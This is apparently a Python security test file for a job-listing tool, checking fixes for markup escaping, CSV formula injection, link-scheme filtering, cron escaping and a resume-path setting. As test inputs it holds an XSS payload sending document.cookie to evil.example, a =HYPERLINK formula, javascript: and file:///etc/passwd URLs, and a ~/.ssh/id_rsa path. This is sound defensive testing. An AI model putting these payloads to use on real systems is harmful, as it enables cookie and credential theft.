"""
Quick fixes from the code scans of 2026-11-06 (SCAN-2026-11-06.local.md):
F4 (a model name into the page's HTML), #10 (Retry-After), #12 (a count
the page sent), #13 (% in the cron line), #1 (a resume path the page
named), #2 (formulas in a CSV export) and #3 (link schemes in the report
and the digest). Nothing here touches the network or live data.

    python tests/test_quick_security.py
"""

from __future__ import annotations

import csv
import sqlite3
import sys
import tempfile
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parent))

from test_serve import _with_server

from jobdork.ai import llm
from jobdork.core import config as config_mod
from jobdork.core import schedule, textutil
from jobdork.core.config import Config, ConfigError, Llm, Reader
from jobdork.db.store import Role, Store
from jobdork.fetch.http import Fetcher
from jobdork.output import digest, render
from jobdork.web import api as api_mod
from jobdork.web import serve as serve_mod

ROOT = Path(__file__).resolve().parent.parent
HOSTILE = '<img src=x onerror="fetch(`//evil.example/`+document.cookie)">'


def test_f4_a_model_name_is_escaped_and_must_be_a_name():
    page = (ROOT / "jobdork" / "data" / "dashboard.html").read_text(encoding="utf-8")
    assert "checked by ${g.model}" not in page, "every checker name goes through esc()"
    for good in ("gemma4:26b", "hf.co/org/model:Q4_K_M", "claude-opus-5-5",
                 "openai/gpt-oss-120b", "llama3.1:8b-instruct-q4_0"):
        assert config_mod.MODEL_NAME.match(good), good
    cfg = Config(titles_include=["x"], llm=Llm(provider="ollama", model="m",
                                               readers=[Reader("ollama", HOSTILE)]))
    try:
        config_mod._validate(cfg)
    except ConfigError as exc:
        assert "not a model name" in str(exc)
    else:
        raise AssertionError("a name with markup was saved")
    real = llm.list_models
    # lambda: another computer's Ollama answering with one name that is not one.
    llm.list_models = lambda settings: ["gemma4:26b", HOSTILE]
    try:
        found = api_mod.llm_models(Config(titles_include=["x"]), "ollama",
                                   "http://192.0.2.1:11434")
    finally:
        llm.list_models = real
    assert found["models"] == ["gemma4:26b"]


def test_10_a_retry_after_that_is_not_a_pause_is_ignored():
    for value, seconds in (("30", 30.0), ("-1", 0.0), ("NaN", 0.0), ("inf", 0.0),
                           ("", 0.0), ("soon", 0.0), (None, 0.0)):
        assert Fetcher.retry_seconds(value) == seconds, value
    fetcher = Fetcher("jobdork-test", timeout=2, retries=0)
    fetcher._note_429("a.test", "inf")          # once raised or blocked for ever
    fetcher._note_429("a.test", "-1")


def test_12_a_count_that_is_not_one_is_refused_with_a_reason():
    assert serve_mod._count(None) == 0 and serve_mod._count("15") == 15
    for bad in ("abc", "1.5", "-3"):
        try:
            serve_mod._count(bad)
        except api_mod.ApiError:
            pass
        else:
            raise AssertionError(bad)

    def check(run):
        code, body = run.post("/api/judge", {"limit": "abc"})
        assert code == 400 and b"whole number" in body, (code, body)
    _with_server(check)


def test_13_a_percent_in_a_path_survives_the_cron_line():
    plan = schedule._plan_from_days(list(range(7)), 8, 30)
    line = schedule.Crontab().line(plan, ["/home/me/100%/jobdork", "--scan"], "/home/me/a%b")
    command = line.split(" ", 5)[5]
    assert "%" not in command.replace("\\%", ""), "cron would read a bare % as a new line"
    _plan, argv = schedule.Crontab.parse(line)
    assert argv == ["/home/me/100%/jobdork", "--scan"]


def test_1_the_page_cannot_name_a_resume_path():
    def check(run):
        code, body = run.post_json("/api/config", {"resume_path": "~/.ssh/id_rsa"})
        assert code == 400 and b"uploading it" in body, (code, body)
        assert run.cfg_now.resume_path in ("", None)
        # The page's own value, sent back unchanged with a save, is let through.
        code, _ = run.post_json("/api/config", {"resume_path": run.cfg_now.resume_path or "",
                                                "update_check": False})
        assert code == 200
    _with_server(check)


def _rows(tmp: str, title: str, url: str) -> list[sqlite3.Row]:
    db = str(Path(tmp) / "t.db")
    with Store(db) as store:
        store.upsert(Role(platform="site", company="@Acme", title=title, url=url,
                          location_raw="+Somewhere"))
        store.conn.commit()
        return store.list_roles()


def test_2_text_from_a_board_is_never_a_formula_in_the_csv():
    with tempfile.TemporaryDirectory() as tmp:
        rows = _rows(tmp, '=HYPERLINK("https://evil.example","Apply")', "https://x.test/1")
        path = render.to_csv(rows, Path(tmp) / "roles.csv")
        with path.open(encoding="utf-8", newline="") as fh:
            header, row = list(csv.reader(fh))[:2]
    cell = dict(zip(header, row, strict=True))
    assert cell["title"].startswith("'=HYPERLINK"), cell["title"]
    assert cell["company"] == "'@Acme" and cell["location"] == "'+Somewhere"
    assert textutil.spreadsheet_cell("Nurse") == "Nurse"
    assert textutil.spreadsheet_cell(None) == ""


def test_3_only_a_web_address_becomes_a_link_in_the_report_and_digest():
    assert textutil.web_href("https://x.test/a") == "https://x.test/a"
    for bad in ("javascript:alert(1)", " JavaScript:alert(1)", "data:text/html,x",
                "file:///etc/passwd", ""):
        assert textutil.web_href(bad) == "", bad
    with tempfile.TemporaryDirectory() as tmp:
        rows = _rows(tmp, "Engineer", "javascript:alert(document.cookie)")
        page = render.to_html(rows, Path(tmp) / "index.html").read_text(encoding="utf-8")
        mail = digest.build(rows, Config(titles_include=["x"]), new_only=False)
    assert "javascript:" not in page.lower()
    assert "javascript:" not in mail.html.lower()


# ── keep this block LAST ───────────────────────────────────────────────────────

if __name__ == "__main__":
    failures = 0
    tests = [(name, fn) for name, fn in sorted(globals().items())
             if name.startswith("test_") and callable(fn)]
    for name, fn in tests:
        try:
            fn()
            print(f"ok   {name}")
        except BaseException as exc:
            failures += 1
            print(f"FAIL {name}: {type(exc).__name__}: {exc}")
    print(f"{len(tests) - failures}/{len(tests)} passed")
    raise SystemExit(1 if failures else 0)
